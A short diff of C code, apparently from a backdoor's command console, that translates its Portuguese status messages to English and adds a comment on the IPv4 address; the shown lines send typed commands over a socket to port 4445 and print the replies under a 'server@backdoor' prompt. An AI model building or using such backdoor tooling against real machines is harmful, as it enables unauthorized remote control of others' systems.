@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
-#define LOCAL "127.0.0.1"
+#define LOCAL "127.0.0.1" // you should use only ipv4 here
 #define PORT "4445"
 struct term
 {
@@ -50,8 +50,8 @@ int main(int argc, char*argv[])
 		printf("\nserver@backdoor$\\:");
 		fgets(buffer,20,stdin);
 		send(fdc,buffer,sizeof(buffer),0);
-		printf("comando enviado!\n");
-		printf("aguardar retorno...\n\n");
+		printf("sent!\n");
+		printf("wait...\n\n");
 		memset(buffer,0,strlen(buffer));
 		recv(fdc,buffer,sizeof(buffer),0);
 		printf("%s",buffer);
